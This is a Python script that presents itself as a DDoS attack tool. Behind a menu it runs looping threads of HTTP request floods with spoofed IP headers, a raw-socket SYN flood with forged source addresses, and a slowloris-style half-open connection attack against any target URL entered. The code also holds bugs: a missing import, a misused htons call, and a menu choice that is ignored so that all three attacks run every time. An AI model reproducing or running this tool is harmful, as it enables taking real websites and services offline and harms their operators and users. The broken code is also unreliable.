import os
import threading
import time
import requests
from urllib.parse import urlparse
from colorama import Fore, Style
from socket import *
from random import randrange, choice
import re

print("""
.-.   .-..-..----.  .---.  .----. .----.     .----..-----..-. .-..----. .-. .---.  
 \ \_/ / { || {_} }/ {-. \{ {__-`{ {__-`    { {__-``-' '-'| } { |} {-. \{ |/ {-. \ 
  \   /  | }| {_} }\ '-} /.-._} }.-._} }    .-._} }  } {  \ `-' /} '-} /| }\ '-} / 
   `-'   `-'`----'  `---' `----' `----'     `----'   `-'   `---' `----' `-' `---'  
""")

class DDoSAttack:
    def __init__(self, target_url, threads):
        # Đảm bảo URL có schema
        if not urlparse(target_url).scheme:
            target_url = 'http://' + target_url
        self.target_url = target_url
        self.threads = threads
        self.attack_num = 0
        self.target_domain = urlparse(target_url).netloc
        self.target_path = urlparse(target_url).path or "/"

    def start(self):
        print(f"Starting attack on {self.target_url}")
        for _ in range(self.threads):
            thread = threading.Thread(target=self.run)
            thread.start()

    def run(self):
        while True:
            self.ddos_requester()
            self.syn_flood()
            self.pyslow()
            time.sleep(5)  # Wait a bit before restarting

    def ddos_requester(self):
        headers = {
            'X-Forwarded-For': self.fake_ip(),
            'User-Agent': choice(self.add_useragent()),
            'Cache-Control': 'no-cache',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        try:
            response = requests.get(f"{self.target_url}{self.target_path}", headers=headers)
            self.attack_num += 1
            print(Fore.GREEN + f"Requester packet sent! Attack count: {self.attack_num} - Response code: {response.status_code}" + Style.RESET_ALL)
        except requests.RequestException as e:
            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)

    def add_useragent(self):
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
        ]

    def syn_flood(self):
        try:
            ip_header = self.create_ip_header()
            tcp_header = self.create_tcp_header()
            packet = ip_header + tcp_header

            sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
            sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            sock.sendto(packet, (self.target_domain, 0))
            print(Fore.GREEN + "SYN Flood packet sent!" + Style.RESET_ALL)
        except KeyboardInterrupt:
            print("SYN Flood stopped.")
        except Exception as e:
            print(Fore.RED + f"Error in SYN Flood: {e}" + Style.RESET_ALL)

    def pyslow(self):
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.connect((self.target_domain, 80))
            sock.send(b'GET / HTTP/1.1\r\n')
            time.sleep(5)
            print(Fore.GREEN + "Pyslow connection established!" + Style.RESET_ALL)
        except KeyboardInterrupt:
            print("Pyslow stopped.")
        except Exception as e:
            print(Fore.RED + f"Error in Pyslow: {e}" + Style.RESET_ALL)

    def fake_ip(self):
        return '.'.join(str(randrange(256)) for _ in range(4))

    def create_ip_header(self):
        ihl = 5
        version = 4
        tos = 0
        tot = 40
        id = 54321
        frag_off = 0
        ttl = 64
        protocol = IPPROTO_TCP
        check = 10
        s_addr = inet_aton(self.fake_ip())
        d_addr = inet_aton(self.target_domain)
        ihl_version = (version << 4) + ihl
        return pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)

    def create_tcp_header(self):
        source = 54321
        dest = 80
        seq = 0
        ack_seq = 0
        doff = 5
        tcp_flags = 1
        window = socket.htons(5840)
        check = 0
        urg_prt = 0

        offset_res = (doff << 4)
        return pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)

def menu():
    print(Style.BRIGHT + Fore.MAGENTA + """
.-.   .-..-..----.  .---.  .----. .----.     .----..-----..-. .-..----. .-. .---.  
 \ \_/ / { || {_} }/ {-. \{ {__-`{ {__-`    { {__-``-' '-'| } { |} {-. \{ |/ {-. \ 
  \   /  | }| {_} }\ '-} /.-._} }.-._} }    .-._} }  } {  \ `-' /} '-} /| }\ '-} / 
   `-'   `-'`----'  `---' `----' `----'     `----'   `-'   `---' `----' `-' `---'  
""" + Style.RESET_ALL)
    print(Style.BRIGHT + Fore.YELLOW + "[INFORMATION!]" + Fore.WHITE + " Press CTRL + C and ENTER to exit!!")
    print(Fore.BLUE + Style.BRIGHT + "=====================>>>>>>>>>>>>>>>>")
    print(Fore.WHITE + Style.BRIGHT + "Please choose from the following options...")
    print(Fore.WHITE + Style.BRIGHT + "1. DDoS Requester [1]")
    print(Fore.WHITE + Style.BRIGHT + "2. SYN Flood [2]")
    print(Fore.WHITE + Style.BRIGHT + "3. Pyslow [3]")
    print(Fore.WHITE + Style.BRIGHT + "4. Exit [4]")
    print("Enter your choice...")

    try:
        choice = int(input())
        if choice == 1:
            attack_type = 'requester'
        elif choice == 2:
            attack_type = 'synflood'
        elif choice == 3:
            attack_type = 'pyslow'
        elif choice == 4:
            print("Exiting!")
            return
        else:
            print("Please select a valid option!")
            menu()
            return
        
        threads = int(input("Enter number of threads: "))
        target_url = input(Fore.RED + Style.BRIGHT + "Enter target URL: " + Style.RESET_ALL)

        attack = DDoSAttack(target_url, threads)
        attack.start()
        
    except ValueError:
        print(Fore.RED + "Please enter a valid number." + Style.RESET_ALL)
        menu()

if __name__ == "__main__":
    menu()